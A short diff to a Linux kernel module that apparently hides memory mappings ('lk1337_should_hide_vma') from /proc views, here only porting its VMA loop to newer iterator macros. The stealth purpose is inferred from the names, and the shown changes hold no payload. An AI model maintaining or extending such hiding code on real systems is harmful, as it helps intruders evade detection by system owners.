@@ -12,6 +12,7 @@
 #include <linux/ctype.h>
 #include <linux/module.h>
 #include <linux/spinlock.h>
+#include "kcompat.h"
 #include "internal.h" /* get_proc_task()/PROC_I for proc map_files inodes */
 
 /*
@@ -383,10 +384,13 @@ static bool lk1337_mm_has_hidden_vma(struct mm_struct *mm)
 	if (!mm)
 		return false;
 	mmap_read_lock(mm);
-	for (vma = mm->mmap; vma; vma = vma->vm_next) {
+	{
+		LK1337_VMA_ITER(vmi, mm, 0);
+		LK1337_FOR_EACH_VMA(vmi, vma) {
 		if (lk1337_should_hide_vma(vma)) {
 			found = true;
 			break;
+		}
 		}
 	}
 	mmap_read_unlock(mm);
